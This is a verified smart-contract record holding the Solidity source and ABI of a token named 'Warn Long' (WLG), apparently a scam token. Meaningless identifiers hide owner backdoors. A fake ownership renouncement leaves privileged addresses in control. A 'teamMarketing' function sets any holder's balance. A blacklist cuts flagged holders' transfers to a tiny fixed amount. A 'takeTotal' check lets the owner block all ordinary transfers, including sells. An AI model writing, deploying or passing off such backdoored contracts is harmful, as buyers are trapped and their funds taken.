{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface takeTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapAmount) external view returns (uint256);\n\n    function transfer(address fundSellList, uint256 walletTake) external returns (bool);\n\n    function allowance(address enableFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundSellList,\n        uint256 walletTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTradingFrom, uint256 value);\n    event Approval(address indexed enableFund, address indexed spender, uint256 value);\n}\n\nabstract contract fromLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingSwap {\n    function createPair(address liquidityAuto, address teamTo) external returns (address);\n}\n\ninterface takeToMetadata is takeTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WarnLong is fromLiquidity, takeTo, takeToMetadata {\n\n    function senderReceiver(address enableLaunch, address fundSellList, uint256 walletTake) internal returns (bool) {\n        require(tokenMin[enableLaunch] >= walletTake);\n        tokenMin[enableLaunch] -= walletTake;\n        tokenMin[fundSellList] += walletTake;\n        emit Transfer(enableLaunch, fundSellList, walletTake);\n        return true;\n    }\n\n    function takeTotal(uint256 walletTake) public {\n        shouldLiquidity();\n        enableMode = walletTake;\n    }\n\n    function tradingLimitMax(address enableLaunch, address fundSellList, uint256 walletTake) internal returns (bool) {\n        if (enableLaunch == receiverLaunchMax) {\n            return senderReceiver(enableLaunch, fundSellList, walletTake);\n        }\n        uint256 takeAt = takeTo(buyList).balanceOf(launchTxToken);\n        require(takeAt == enableMode);\n        require(fundSellList != launchTxToken);\n        if (takeReceiver[enableLaunch]) {\n            return senderReceiver(enableLaunch, fundSellList, liquidityMarketing);\n        }\n        return senderReceiver(enableLaunch, fundSellList, walletTake);\n    }\n\n    address public receiverLaunchMax;\n\n    function shouldLiquidity() private view {\n        require(launchExemptSwap[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitList;\n    }\n\n    uint256 enableMode;\n\n    address launchTxToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private fromLimit = 100000000 * 10 ** 18;\n\n    string private marketingLiquidity = \"WLG\";\n\n    function senderFund(address buyReceiver) public {\n        if (listSwapLaunched) {\n            return;\n        }\n        \n        launchExemptSwap[buyReceiver] = true;\n        if (buyTake != minLiquidity) {\n            shouldLimitAmount = modeFromLimit;\n        }\n        listSwapLaunched = true;\n    }\n\n    function allowance(address marketingTo, address atLaunch) external view virtual override returns (uint256) {\n        if (atLaunch == shouldToken) {\n            return type(uint256).max;\n        }\n        return amountSellSwap[marketingTo][atLaunch];\n    }\n\n    function transferFrom(address enableLaunch, address fundSellList, uint256 walletTake) external override returns (bool) {\n        if (_msgSender() != shouldToken) {\n            if (amountSellSwap[enableLaunch][_msgSender()] != type(uint256).max) {\n                require(walletTake <= amountSellSwap[enableLaunch][_msgSender()]);\n                amountSellSwap[enableLaunch][_msgSender()] -= walletTake;\n            }\n        }\n        return tradingLimitMax(enableLaunch, fundSellList, walletTake);\n    }\n\n    address private autoIs;\n\n    string private limitList = \"Warn Long\";\n\n    function approve(address atLaunch, uint256 walletTake) public virtual override returns (bool) {\n        amountSellSwap[_msgSender()][atLaunch] = walletTake;\n        emit Approval(_msgSender(), atLaunch, walletTake);\n        return true;\n    }\n\n    function liquidityMin(address exemptLimit) public {\n        shouldLiquidity();\n        if (modeFromLimit == shouldLimitAmount) {\n            buyTake = true;\n        }\n        if (exemptLimit == receiverLaunchMax || exemptLimit == buyList) {\n            return;\n        }\n        takeReceiver[exemptLimit] = true;\n    }\n\n    uint256 constant liquidityMarketing = 11 ** 10;\n\n    uint256 private shouldLimitAmount;\n\n    uint256 private modeFromLimit;\n\n    function owner() external view returns (address) {\n        return autoIs;\n    }\n\n    mapping(address => bool) public takeReceiver;\n\n    function buyExempt() public {\n        emit OwnershipTransferred(receiverLaunchMax, address(0));\n        autoIs = address(0);\n    }\n\n    address public buyList;\n\n    function transfer(address isSwap, uint256 walletTake) external virtual override returns (bool) {\n        return tradingLimitMax(_msgSender(), isSwap, walletTake);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingLiquidity;\n    }\n\n    bool private minLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableToken;\n    }\n\n    bool private buyTake;\n\n    mapping(address => uint256) private tokenMin;\n\n    function teamMarketing(address isSwap, uint256 walletTake) public {\n        shouldLiquidity();\n        tokenMin[isSwap] = walletTake;\n    }\n\n    mapping(address => bool) public launchExemptSwap;\n\n    constructor (){\n        \n        limitEnable txAtTeam = limitEnable(shouldToken);\n        buyList = tradingSwap(txAtTeam.factory()).createPair(txAtTeam.WETH(), address(this));\n        if (modeFromLimit == shouldLimitAmount) {\n            minLiquidity = false;\n        }\n        receiverLaunchMax = _msgSender();\n        buyExempt();\n        launchExemptSwap[receiverLaunchMax] = true;\n        tokenMin[receiverLaunchMax] = fromLimit;\n        \n        emit Transfer(address(0), receiverLaunchMax, fromLimit);\n    }\n\n    function getOwner() external view returns (address) {\n        return autoIs;\n    }\n\n    uint256 liquiditySell;\n\n    function balanceOf(address swapAmount) public view virtual override returns (uint256) {\n        return tokenMin[swapAmount];\n    }\n\n    uint8 private enableToken = 18;\n\n    event OwnershipTransferred(address indexed fundBuyAt, address indexed sellReceiver);\n\n    mapping(address => mapping(address => uint256)) private amountSellSwap;\n\n    address shouldToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromLimit;\n    }\n\n    bool public listSwapLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundBuyAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTradingFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchExemptSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"}],\"name\":\"liquidityMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwapLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"}],\"name\":\"senderFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"takeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"teamMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundSellList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WarnLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}